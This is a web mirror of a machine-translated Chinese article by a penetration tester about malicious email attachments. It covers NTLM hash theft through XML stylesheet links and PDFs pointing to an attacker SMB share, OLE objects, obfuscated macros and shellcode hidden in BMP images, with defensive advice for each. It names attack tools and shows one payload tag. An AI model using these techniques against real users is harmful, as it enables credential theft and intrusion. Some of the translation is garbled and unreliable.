<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🔺 🙅🏾 📛 开路不容忽视 👩🏿‍🤝‍👩🏽 🍼 🍥</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="我的工作与以下事实有关：我对人撒谎，并利用他们的易变性，好奇心，贪婪等。 我热爱我的工作，并尝试创造性地处理它。 我的活动细节与通过社会工程学方法进行攻击有关。 在这篇文章中，我想谈一谈恶意附件。 

 如果PDF属于您的邮件，您会打开它吗？ 和Word文件？ 您会从未知来源打开图像吗？ 如果下载存...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>开路不容忽视</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/426463/"><img src="https://habrastorage.org/webt/j-/hv/q2/j-hvq2d89iomeavboeblim7pi9y.jpeg"><br><br> 我的工作与以下事实有关：我对人撒谎，并利用他们的易变性，好奇心，贪婪等。 我热爱我的工作，并尝试创造性地处理它。 我的活动细节与通过社会工程学方法进行攻击有关。 在这篇文章中，我想谈一谈恶意附件。 <br><a name="habracut"></a><br> 如果PDF属于您的邮件，您会打开它吗？ 和Word文件？ 您会从未知来源打开图像吗？ 如果下载存档，可能会遇到麻烦吗？ 您如何知道哪些投资具有危险性，哪些则没有危险？ 那你的同事呢？ <br><br> 对于几十个项目，我尝试了完全不同的方式来将有效负载交付给用户。 有些非常有效，有些很容易被发现-每个都有自己的缺点和优点。 我不会开始讲述如何在归档文件中打包扩展名为.exe的可执行文件。 使用这种老式的方法，要突破安全系统，然后还要让用户启​​动附件，则更加昂贵。 我将告诉您今天实际上可以通过邮件接收（或发送）哪些潜在危险文件。 <br><br> 免责声明：以下所有内容仅供参考。 作者描述了在渗透测试中获得的经验，对这些攻击的重复不承担任何责任，并鼓励不要将这些材料用于非法目的。 <br><br><h2>  XML格式 </h2><br>  <b>方法的本质</b> <br><br> 大多数Office文件都基于Microsoft Office Open XML（OOXML），它实际上是Microsoft开发的一种压缩XML格式，用于显示表格，图表，演示文稿等。  XML扩展显示在文档扩展名（docx，xl​​sx，pptx）中。 很好奇这样的Office文档可以作为具有所有标签和属性的常规文本文件打开。 任何Office Open XML文件都可以另存为XML并更改标签。 例如，将链接添加到由攻击者控制的公用文件夹。 当您运行XML文件时，它将尝试连接到打开的公用文件夹。 当尝试通过smb-protocol连接时，Windows会提供NTLM哈希（NTLMv2）并向攻击者登录。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/08c/d1a/28f/08cd1a28f9c6ee5699c995d8cf3377e2.png"><br><br>  <b>简而言之实现</b> <br><br> 要实现矢量，您需要创建一个Office Open XML文档（docx，pptx，xlsx等），并将其另存为XML。 打开XML并进行以下更改： <br><br> <code>&lt;?xml-stylesheet type="text/xsl" href="\\xxx.xxx.xxx.xxx <u>\test\swordfish.xsl</u> "&gt;</code> <br> <br> 在指定的标记中，您必须指定受害者将连接到的公用网络文件夹的地址。 <br><br>  <b>注意</b> ：您可以编写<code>file:/// xxx.xxx.xxx.xxx/test/swordfish.xsl</code> ，而不是<code>="\\xxx.xxx.xxx.xxx\test\swordfish.xsl</code> 。接下来，必须保存文件并将其发送给受害者。 <br><br> 可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>找到有关攻击的信息。 <br><br>  <b>注意</b> ：根据操作系统和设置，用户可能必须同意其他条件或注释，例如： <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e3/175/b41/0e3175b41c0ef9cb1e79c19295710e94.png"><br><br> 没有保护建议，文章将是不完整的： <br><br><ul><li> 使用复杂的密码策略。 </li><li> 使用NTLMv2。 </li><li> 通过smb（tcp 139/445）拒绝外部流量。 </li></ul><br><h2> 错误的pdf </h2><br>  <b>方法的本质</b> <br><br> 标记将添加到PDF文件中，并带有指向由攻击者控制的公共smb服务器的链接。 如上例所示，当打开文件时，操作系统将传输NTLM哈希（NTLMv2）以连接到公用文件夹。 <br><br>  <b>简而言之实现</b> <br><br> 实施此攻击比上一次要容易得多。 要成功窃取哈希，只需下载实用程序（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>或<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处的</a> git clone）并授予执行（chmod + x）python文件的权利。 接下来，运行python脚本并输入IP地址，文件名和接口，如下图所示。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/318/d7c/e30/318d7ce30c76b661055d975b8875b597.png"><br>  <i>生成有效载荷文件。</i> <br><br> 可以以祝贺，签名文件，应用程序扫描等为幌子将接收到的文件发送到邮件中。 文件启动时，所有哈希将发送给攻击者。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/198/0d6/dd2/1980d6dd2efd24b39c393c31f4b36611.png"><br><br>  <b>防护等级</b> <br><br><ul><li> 使用复杂的密码策略。 </li><li> 使用NTLMv2。 </li><li> 通过smb（tcp 139/445）拒绝外部流量。 </li></ul><br><h2>  OLE对象 </h2><br>  <b>方法的本质</b> <br><br> 在合法的Office文档中，嵌入了通过单击启动的脚本。 该脚本可以是任何脚本，通常只是有效负载。 它有自己的图标，可以根据攻击者的意愿进行更改，最多可以是模拟错误消息的Office文档样式的完整副本。 与宏不同，带有OLE附件的文件对于普通用户而言并不可疑。 <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b16/113/233/b161132334ba58421370c143a9942677.png" width="400"></div><br>  <b>简而言之实现</b> <br><br> 为应对这种攻击做准备，将需要花费更多的精力（与上述相比）。 第一步是生成有效负载。 接下来，您需要启动服务器，它将接收来自有效负载的连接，然后创建一个Word文档，将其转换为RTF并添加一个指向有效负载的链接。 如果简短。 <br> 可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>找到有关攻击的信息。 <br><br>  <b>防护等级</b> <br><br> 为了防止此类攻击，我们<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">建议您</a>进行以下注册表更改： <br><br> <code>HKCUSoftwareMicrosoftOffice -&gt; Office Version -&gt; Office application -&gt; SecurityPackagerPrompt</code> <br> <br>  <code>Office Version</code>值可能是16.0（Office 2016）;  15.0（Office 2013）；  14.0（Office 2010）； 或12.0（Office 2007）。  <code>Office application</code>的值是特定Office应用程序的名称，即Word，Excel等。 <br><br> 该注册表项的值应为“ 2”，表示“无提示，对象不执行”或实际禁止执行对象。 值为“ 1”允许用户“在用户单击，对象执行时从Office提示”，即单击对象并单击Office，并显示相应的消息。 反之，值“ 0”表示“当用户单击，对象执行时，没有来自Office的提示”，换句话说，对象已执行，但用户未从Office收到任何消息。 <br><br> 如果您公司的业务流程中未使用这些功能，则可以进行更改。 <br><br><h2> 巨集 </h2><br> 自从提到OLE以来，我怎能不提及宏？ <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ae7/b0b/9f7/ae7b0b9f78363bd943682230cc391fb8.png"><br><br>  <b>方法的本质</b> <br><br> 宏-一组旨在简化用户工作的命令。 潜在地，您可以在宏中编写任何绝对的命令集，从而获得有效载荷。 要使用宏创建文档，攻击者只需混淆有效负载代码并将代码添加到文档宏即可。 <br><br>  <b>简而言之实现</b> <br><br> 目前，有很多方法可以生成宏。 您可以使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Luckystrike</a>工具，也可以停在更熟悉的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Metasploit上</a> 。 您可以使用msfvenom并在生成后混淆宏。 创建宏后，您所需要做的就是将其添加到Office文档中。 但是，与OLE附件不同，您确实需要大量的精力来运行宏。 目前，很少有用户会运行宏。  Windows已经学会了警告可疑的宏，并且已经有很多关于它们的危险的讨论。 <br><br>  <b>防护等级</b> <br><br> 为了提高可靠性，我建议禁用宏执行而无需通知。 <br><br><h2> 骨形态发生蛋白 </h2><br> 您几乎不可能遇到带有shellcode的BMP附件，因此请注意：确实有这种情况。 <br><br>  <b>方法的本质</b> <br><br>  Shell代码以BMP格式嵌入到映像中。 发现时图像本身并不危险。 这并不是要让攻击者进行会话。 当攻击者使用Powershell命令激活图片时，需要躺下图片并等待一个小时。 这种方法与其说是绕过防病毒和入侵检测工具，不如说是一种攻击。 <br><br>  <b>简而言之实现</b> <br><br> 要创建图片，只需使用此<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">存储库</a> 。  DKMC提供了从图像生成到代码混淆的所有功能。 我还想指出，“受感染”的图像将包含奇怪的彩色像素。 如果将图像的可见区域裁切5-10像素，则可以轻松解决此问题。 <br><br> 创建映像后，必须将文件交付给受害者，并等待正确的时机或寻找运行Powershell脚本的机会。 <br><br>  <b>防护等级</b> <br><br> 将每个bmp文件过滤为潜在危险是低效率的。 您可以使用转换器并以其他格式保存图像，检查计算机上的文件，或者接受以下事实：如果攻击者设法在员工的计算机上使用了Powershell脚本，则存在带有Shell代码的图像并不是主要的安全问题。 <br><br> 实际上，仅此而已。 我希望本文能加深您对投资及其可能带来的危险的理解。 稍后我们将讨论可疑链接。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95a/62c/c68/95a62cc68d2af00c3b53b649faf4638b.png"><br><br>  <i>Ekaterina Rudaya（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">Caterin</a> ），Jet信息系统实用安全分析实验室的专家</i> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN426463/">https://habr.com/ru/post/zh-CN426463/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN426449/index.html">iPhone XS：为什么是全新的相机</a></li>
<li><a href="../zh-CN426451/index.html">告别机器人中最温柔的巨人巴克斯特（Baxter）</a></li>
<li><a href="../zh-CN426457/index.html">Google用户的IPv6连接数量已突破25％的里程碑</a></li>
<li><a href="../zh-CN426459/index.html">哈布罗克维斯特（Habrokvest）纪念Mail.Ru集团成立20周年-20个任务</a></li>
<li><a href="../zh-CN426461/index.html">车库查找：TESLA，无需运行</a></li>
<li><a href="../zh-CN426465/index.html">“我们正在改变地形”-IT进入了一个大型建筑工地</a></li>
<li><a href="../zh-CN426469/index.html">电报作为企业标准</a></li>
<li><a href="../zh-CN426471/index.html">间谍软件数据如何泄漏</a></li>
<li><a href="../zh-CN426473/index.html">Redux体系结构。 是或否？</a></li>
<li><a href="../zh-CN426475/index.html">宫-智能手机助手</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>